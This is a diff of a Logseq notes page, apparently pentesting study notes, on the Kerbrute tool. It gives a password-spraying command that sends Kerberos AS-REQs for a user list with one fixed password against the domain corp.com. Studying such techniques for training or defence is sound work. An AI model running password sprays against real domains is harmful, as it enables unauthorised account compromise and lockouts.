@@ -53,10 +53,8 @@ public:: true
 			  logseq.order-list-type:: number
 	- [[Kerbrute]]
 	  logseq.order-list-type:: number
+		- {{embed ((655cbd1e-9c3e-4f5c-af2e-247535fac289))}}
 		- Iterate through a list of users and file [AS-REQ](((655b1c01-e1e1-4be0-b245-ff8c9482df38)))s to the domain controller using a fixed password.
 		  ```bash
 		  kerbrute_linux_amd64 passwordspray -d corp.com .\usernames.txt "Nexus123!"
 		  ```
-		- #+BEGIN_TIP
-		  [Fast and stealth!](((655cbd1e-9c3e-4f5c-af2e-247535fac289)))
-		  #+END_TIP
